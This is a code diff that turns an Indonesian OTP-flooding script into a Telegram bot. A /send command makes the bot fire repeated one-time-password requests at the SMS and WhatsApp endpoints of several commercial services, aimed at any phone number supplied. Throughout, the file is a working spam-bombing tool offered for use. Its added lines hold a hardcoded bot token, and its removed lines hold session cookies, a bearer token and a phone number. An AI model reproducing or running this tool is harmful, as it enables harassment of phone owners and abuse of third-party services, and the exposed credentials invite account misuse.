@@ -1,16 +1,9 @@
-import os, sys, time, json, requests
+import os, sys, time, json, requests, random, uuid
+import telepot
+from telepot.loop import MessageLoop
 from colorama import Fore, init
-from sys import argv
-import random
-import uuid
 
 init(autoreset=True)
-
-def autotype(s):
-    for c in s + "\n":
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(0.008)
 
 B = Fore.BLUE
 W = Fore.WHITE
@@ -18,10 +11,7 @@ R = Fore.RED
 G = Fore.GREEN
 Y = Fore.YELLOW
 
-hijau = "\033[1;92m"
-putih = "\033[1;97m"
-biru = "\033[1;96m"
-kuning = "\033[1;93m"
+TELEGRAM_BOT_TOKEN = '7343185902:AAHZY20yHJUUYUII1jzm3Ko7onbsCQF4wgs'
 
 def generate_user_agent():
     browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
@@ -47,22 +37,20 @@ def generate_sec_ch_ua_platform():
     platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
     return f"\"{random.choice(platforms)}\""
 
-inputNomer = argv[1]
-inputJumlah = argv[2]
-nomor_matahari = inputNomer.replace("+62", "0")
-nomor_mraladin = inputNomer.replace("+62", "")
-nomor_pinhome = inputNomer.replace("+62", "")
-nomor_saturdays = inputNomer.replace("+62", "")
-nomor_redbus = inputNomer.replace("+62", "")
-nomor_saturdays = inputNomer.replace("+62", "")
-nomor_sobatbangun = inputNomer.replace("+62", "62")
-nomor_nutriclub = inputNomer.replace("+62", "0")
-nomor_ruangguru = inputNomer.replace("+62", "62")
-nomor_bpjsktn = inputNomer.replace("+62", "62")
+# Fungsi untuk mengirim OTP ke beberapa layanan
+def send_otp(inputNomer, inputJumlah):
+    nomor_matahari = inputNomer.replace("+62", "0")
+    nomor_mraladin = inputNomer.replace("+62", "")
+    nomor_pinhome = inputNomer.replace("+62", "")
+    nomor_saturdays = inputNomer.replace("+62", "")
+    nomor_redbus = inputNomer.replace("+62", "")
+    nomor_sobatbangun = inputNomer.replace("+62", "62")
+    nomor_nutriclub = inputNomer.replace("+62", "0")
+    nomor_ruangguru = inputNomer.replace("+62", "62")
 
-for i in range(int(inputJumlah)):
-    # Sayurbox
-    headers_sayurbox = {
+    for i in range(int(inputJumlah)):
+        # Sayurbox
+        headers_sayurbox = {
         'Accept': '*/*',
         'Accept-Encoding': 'gzip, deflate, br, zstd',
         'Accept-Language': generate_accept_language(),
@@ -86,8 +74,8 @@ for i in range(int(inputJumlah)):
         'X-Sbox-Tenant': 'b2c',
         'X-Supported-Delivery': 'NEXTDAY,SAMEDAY,INSTANT'
     }
-    
-    data_whatsapp_sayurbox = json.dumps({
+
+        data_whatsapp_sayurbox = json.dumps({
             "operationName": "generateOTP",
             "variables": {
                 "destinationType": "whatsapp",
@@ -96,13 +84,13 @@ for i in range(int(inputJumlah)):
             "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
         })
     
-    response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
-    if response_sayurbox_wa.status_code == 200:
-        print(f"{hijau}Berhasil mengirim Whatsapp {inputNomer} via SayurBox")
-    else:
-        print(f"{R}Gagal mengirim Whatsapp {inputNomer} via SayurBox")
-
-    headers_danacita = {
+        response_sayurbox = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
+        if response_sayurbox.status_code == 200:
+            print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Sayurbox")
+        else:
+            print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Sayurbox")
+                
+        headers_danacita = {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
         "Accept-Language": generate_accept_language(),
@@ -127,7 +115,7 @@ for i in range(int(inputJumlah)):
     
     response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
     if response_danacita.status_code == 200:
-        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Danacita")
+        print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Danacita")
     else:
         print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Danacita")
         
@@ -160,7 +148,7 @@ for i in range(int(inputJumlah)):
     
     response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
     if response_mraladin.status_code == 200:
-        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Mister Aladin")
+        print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Mister Aladin")
     else: 
         print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Mister Aladin")
 
@@ -196,7 +184,7 @@ for i in range(int(inputJumlah)):
     
     response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
     if response_pinhome.status_code == 201:
-        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Pinhome")
+        print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Pinhome")
     else:
         print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Pinhome")
         
@@ -234,7 +222,7 @@ for i in range(int(inputJumlah)):
     
     response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
     if response_saturdays.status_code == 200:
-        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Saturdays")
+        print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Saturdays")
     else:
         print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Saturdays")
   
@@ -263,7 +251,7 @@ for i in range(int(inputJumlah)):
     
     response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
     if response_kelaspintar.status_code == 200:
-        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Kelas Pintar")
+        print(f"{G}Berhasil Mengirim SMS/WA To : {inputNomer} via Kelas Pintar")
     else:
         print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Kelas Pintar")
         
@@ -291,7 +279,7 @@ for i in range(int(inputJumlah)):
     
     response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun)
     if response_sobatbangun.status_code == 201:
-        print(f"{hijau}Berhasil mengirim OTP To : {inputNomer} via SobatBangun")
+        print(f"{G}Berhasil mengirim OTP To : {inputNomer} via SobatBangun")
     else:
         print(f"{R}Gagal mengirim OTP To : {inputNomer} via SobatBangun")
         
@@ -320,69 +308,42 @@ for i in range(int(inputJumlah)):
     
     response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={nomor_nutriclub}&old_phone={nomor_nutriclub}", headers=headers_nutriclub, data=data_nutriclub)
     if response_data_nutriclub.status_code == 200:
-        print(f"{hijau}Berhasil mengirim OTP To: {inputNomer} via Nutriclub")
+        print(f"{G}Berhasil mengirim OTP To: {inputNomer} via Nutriclub")
     else:
         print(f"{R}Gagal mengirim OTP To: {inputNomer} via Nutriclub")
-        
-    headers_bpjsktn = {
-    "Accept": "*/*",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
-    "Content-Length": "27",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Cookie": "_csrf=aB5-unm3f38525myLB-ckCM9; PORTAL_BPJSTK=s%3AFAaYjeLXVHr-88bi-1hWBwsGnDWRdhg8.k2QH%2Fsp5HBQBv%2FXz6Yhb8prmRbH50grPFvzYFixi1IQ; BIGipServerWEBSITE_PUBLIK.app~WEBSITE_PUBLIK_pool=!pb9L4gzUUXYxWG8AmPChlSC3JKYpbz04amtqpoUYBwqHc9dw2C2vxXD6gq+BJ3hwbm0FMn93v2zdTAduXWz012uZ8Y8tmPohwoLl62vX3A==; TS0158e00b=011e8ab0a0226f1d9a895053ff0d76b3d82738f44bceb27f508847cb9a3810df3533e896dc1fbaca637ef7409467f8607302767c20d678e13718fe4080d8000672d5f4658ae79c242c89a031ca3375593a6937337999cb3c7cd3f7ea7d2851af0250da1e8a; _ga=GA1.3.929014662.1719500466; _gid=GA1.3.1360160984.1719500466; perf_dv6Tr4n=1; _ga_BVS7MY8Q09=GS1.1.1719500466.1.0.1719500474.0.0.0; _fbp=fb.2.1719500476668.738422368692820991",
-    "Origin": "https://www.bpjsketenagakerjaan.go.id",
-    "Priority": "u=1, i",
-    "Referer": "https://www.bpjsketenagakerjaan.go.id/bpu/profile-pekerja",
-    "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
-    "Sec-Ch-Ua-Mobile": "?0",
-    "Sec-Ch-Ua-Platform": "\"Windows\"",
-    "Sec-Fetch-Dest": "empty",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Site": "same-origin",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "X-Requested-With": "XMLHttpRequest"
-    }
-    
-    data_bpjsktn = json.dumps({
-        "nomor_handphone": "08872403387",
-    })
-    
-    response_bpjsktn = requests.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp", headers=headers_bpjsktn, data=data_bpjsktn)
-    if response_bpjsktn.status_code == 200:
-        print(f"{hijau}Berhasil mengirim OTP To: {inputNomer} via BPJSKetenagakerjaan {response_bpjsktn.status_code} {response_bpjsktn.text}")
+
+def get_username(user_id):
+    user = bot.getChat(user_id)
+    if 'username' in user:
+        return user['username']
     else:
-        print(f"{R}Gagal mengirim OTP To: {inputNomer} via BPJSKetenagakerjaan {response_bpjsktn.status_code} {response_bpjsktn.text}")
-        
-    headers_sociolla = {
-    "Accept": "application/json, text/plain, */*",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
-    "Authorization": "Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXIiOnsiX2lkIjoiNjY3ZDdlNWQ5MDI0ZGIzOTFlODY3MzgzIiwiaWQiOjY2MzQ4MzksImVtYWlsIjoieHpoMTIzQGdtYWlsLmNvbSIsInJvbGUiOiJjb21tdW5pdHkiLCJsb2NhbGUiOiJpZCIsImlzX290cF9hZG1pbiI6ZmFsc2UsInNvY2lvbGxhIjp7ImlkIjoiNjYzNDgzOSIsInRva2VuIjoiZXlKaGJHY2lPaUpJVXpVeE1pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0ltbGtJam9pTmpZek5EZ3pPU0lzSW5WelpYSWlPbnNpYVdRaU9pSTJOak0wT0RNNUluMTlMQ0pwWVhRaU9qRTNNVGsxTURBek9ERXNJbTVpWmlJNk1UY3hPVFV3TURNNU1Td2laWGh3SWpveE56VXhNRE0yTXpneExDSnBjM01pT2lKemMyOHVjMjlqYnk1cFpDSXNJbXAwYVNJNkltSmxaVEkzTVRJeVlUWTNORE13T0RZNE1EVXlNMlkyWkdGbE16VmhaalV5SW4wLm5fVzdPVThPYXA5c0kxVmoxVzNrcWMwdVdjalhkb3pOaE1kMVltdTZ1dXhPaVZQb2tVZE9RYWk1QTZmX3Roa3AxLWpZTEYtZ3FkUXg5d3U3ZENFbWh3In19fSwiaWF0IjoxNzE5NTAwMzgxLCJuYmYiOjE3MTk1MDAzOTEsImV4cCI6MTc1MTAzNjM4MSwiaXNzIjoic3NvLnNvY28uaWQiLCJqdGkiOiJiZWUyNzEyMmE2NzQzMDg2ODA1MjNmNmRhZTM1YWY1MiJ9.szI5f__dolMEYTtIDSUgw0J5za-ybVjyPxUsFGlg1XqJkOB7RC3Bfnoo0DTW6fzrrJc-BkPk7CWDVvrMB2hXQg",
-    "Content-Length": "39",
-    "Content-Type": "application/json",
-    "Cookie": "SOCIOLLA_SESSION_ID=q4dg8pwq-gqnu-r2lh-9gaj-k19i0xudhncx; _ga=GA1.2.961721126.1719500227; _gid=GA1.2.926261044.1719500227; sso_token=9b233d7d9c87a288731d3a2de3869c507131d9ec; SOCIOLLA_UTM_DATA={}; _gcl_au=1.1.2123264232.1719500231; _fbp=fb.1.1719500231614.420925586607707925; moe_uuid=3e45a118-7518-45dd-ab02-e528ce839e2c; _gat_UA-57294171-1=1; _ga_363PMMDMHM=GS1.2.1719500230.1.1.1719500354.58.0.0",
-    "Origin": "https://www.sociolla.com",
-    "Priority": "u=1, i",
-    "Referer": "https://www.sociolla.com/",
-    "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
-    "Sec-Ch-Ua-Mobile": "?0",
-    "Sec-Ch-Ua-Platform": "\"Windows\"",
-    "Sec-Fetch-Dest": "empty",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Site": "same-site",
-    "Session_id": "q4dg8pwq-gqnu-r2lh-9gaj-k19i0xudhncx",
-    "Soc-Platform": "sociolla-web-mobile",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
-    }
+        return None
     
-    data_sociolla = json.dumps({
-        "mode": "whatsapp",
-        "entity": inputNomer
-    })
-    
-    response_sociolla = requests.post("https://soco-api.sociolla.com/auth/otp/code", headers=headers_sociolla, data=data_sociolla)
-    if response_sociolla.status_code == 200:
-        print(f"{hijau}Berhasil mengirim OTP To: {inputNomer} via Sociolla {response_sociolla.status_code} {response_sociolla.text}")
-    else:
-        print(f"{R}Gagal mengirim OTP To: {inputNomer} via Sociolla {response_sociolla.status_code} {response_sociolla.text}")
+def handle(msg):
+    chat_id = msg['chat']['id']
+    command = msg['text'].strip()
+    user_id = msg['from']['id']
+
+    if command.startswith('/send'):
+        username = get_username(user_id)
+        print(f'Info - /instancebuyyer from {username}')
+        args = command.split()[1:]
+        if len(args) != 2:
+            bot.sendMessage(chat_id, "Usage: /send number jumlah\nExample: /spam +6281234567890 20")
+        else:
+            number = args[0]
+            jumlah = args[1]
+            bot.sendMessage(chat_id, f"Sending... OTP to {number} sebanyak {jumlah} kali.")
+            send_otp(number, jumlah)
+            bot.sendMessage(chat_id, f"Done! Send to {number} sebanyak {jumlah} kali.")
+
+if __name__ == '__main__':
+    bot = telepot.Bot(TELEGRAM_BOT_TOKEN)
+    MessageLoop(bot, handle).run_as_thread()
+    print('Bot running...')
+    while True:
+        try:
+            time.sleep(1)
+        except KeyboardInterrupt:
+            print('\nBot stopped.')
+            exit()
